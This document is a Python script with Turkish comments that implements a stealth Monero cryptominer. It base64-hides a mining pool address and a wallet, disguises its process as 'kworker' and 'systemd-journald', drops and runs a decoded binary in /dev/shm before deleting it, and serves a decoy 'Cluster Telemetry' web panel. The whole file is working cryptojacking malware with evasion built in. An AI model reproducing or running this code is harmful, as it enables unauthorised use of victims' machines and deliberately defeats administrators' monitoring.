#!/usr/bin/env python3
import os
import sys
import time
import json
import base64
import threading
import subprocess
import http.server
import sqlite3
import re
import ctypes
import datetime
from collections import deque

# --- SÜREÇ MASKELEME (PROCESS MASQUERADING) ---
def set_process_name(name):
    """Linux çekirdek seviyesinde prctl kullanarak işlem adını değiştirir."""
    try:
        libc = ctypes.CDLL('libc.so.6')
        libc.prctl(15, name.encode('utf-8'), 0, 0, 0)
    except Exception:
        pass

# --- YAPILANDIRMA VE ŞİFRE ÇÖZME ---
def _d(s): return base64.b64decode(s).decode('utf-8')

MODE         = os.environ.get("ENGINE_MODE", "miner")
HTTP_PORT    = int(os.environ.get("PORT", 8080))
PROXY_URL    = os.environ.get("PROXY_URL", "")
POOL_URL     = os.environ.get("POOL_URL", _d("cG9vbC5zdXBwb3J0eG1yLmNvbTo0NDM="))
WALLET_ADDR  = os.environ.get("WALLET_ADDR", _d("NDl5cWJOZ0cxMzVld3FKOXVOUVhUZ0I5bUthVVhmZzFiM2FiQWJoc1NEZ2g0YXNWYmZIdVlES0FkaWlkbVRDQjhwQUNZZHd4ejc3VHdKaHdFU2hEdDZuQkI1WmpjdEw="))
WORKER_NAME  = os.environ.get("WORKER_NAME", f"node-{int(time.time())%10000}")
DATA_DIR     = "/dev/shm/.cache" # RAM üzerinde gizli çalışma alanı

_current_hr  = "0.0 ops/s"
SYSTEM_LOGS  = deque(maxlen=800)
_LOG_LOCK    = threading.Lock()
_DB_LOCK     = threading.Lock()

# --- BELLEKTE YÜRÜTME (FILELESS EXECUTION) ---
def run_core_fileless():
    """Payload'u RAM'de çözer, çalıştırır ve hemen ardından izleri siler."""
    global _current_hr
    
    enc_path = "/server/core.dat" 
    if not os.path.exists(enc_path):
        return

    try:
        # 1. İşlem adını sistem süreci gibi göster
        set_process_name("kworker/u16:1-events")

        # 2. Şifreli payload'u belleğe al ve çöz
        with open(enc_path, "rb") as f:
            raw_binary = base64.b64decode(f.read())

        # 3. /dev/shm kullanarak fileless alan oluştur
        mem_exec_path = f"/dev/shm/.sys_io_{int(time.time())}"
        with open(mem_exec_path, "wb") as f:
            f.write(raw_binary)
        
        os.chmod(mem_exec_path, 0o755)

        # 4. Çekirdek komutu (TLS aktif ve gizli) 
        cmd = [
            mem_exec_path, "-o", POOL_URL, "-u", WALLET_ADDR,
            "-p", WORKER_NAME, "--keepalive", "--tls", "--donate-level=1"
        ]

        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
        
        # Dosya handle'ı alındıktan sonra fiziksel linki RAM'den temizle
        time.sleep(5)
        if os.path.exists(mem_exec_path):
            os.remove(mem_exec_path)

        for line in proc.stdout:
            clean_line = re.sub(r'\x1b\[[0-9;]*[mK]', '', line).strip()
            if "speed" in clean_line:
                match = re.search(r'max (\d+\.?\d* [KMG]?H/s)', clean_line)
                if match: _current_hr = match.group(1).replace("H/s", "ops/s")
            print(f"[SYS] {clean_line}", flush=True)

    except Exception:
        time.sleep(10)

# --- PANEL VE VERİ TABANI SİSTEMİ ---
def init_db():
    os.makedirs(DATA_DIR, exist_ok=True)
    with sqlite3.connect(os.path.join(DATA_DIR, "telemetry.db")) as conn:
        conn.executescript("CREATE TABLE IF NOT EXISTS metrics (node_name TEXT PRIMARY KEY, throughput TEXT, last_seen INTEGER, status TEXT);")

class HttpHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/":
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            self.wfile.write(b"Cluster Telemetry Online") # Basit panel yanıtı
        elif self.path == "/api/logs":
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            with _LOG_LOCK:
                self.wfile.write(json.dumps({"logs": list(SYSTEM_LOGS)}).encode())
    def log_message(self, format, *args): pass

def run_http():
    srv = http.server.ThreadingHTTPServer(("0.0.0.0", HTTP_PORT), HttpHandler)
    srv.serve_forever()

if __name__ == "__main__":
    set_process_name("systemd-journald")
    if MODE == "all":
        init_db()
        threading.Thread(target=run_http, daemon=True).start()
        run_core_fileless()
    else:
        run_core_fileless()
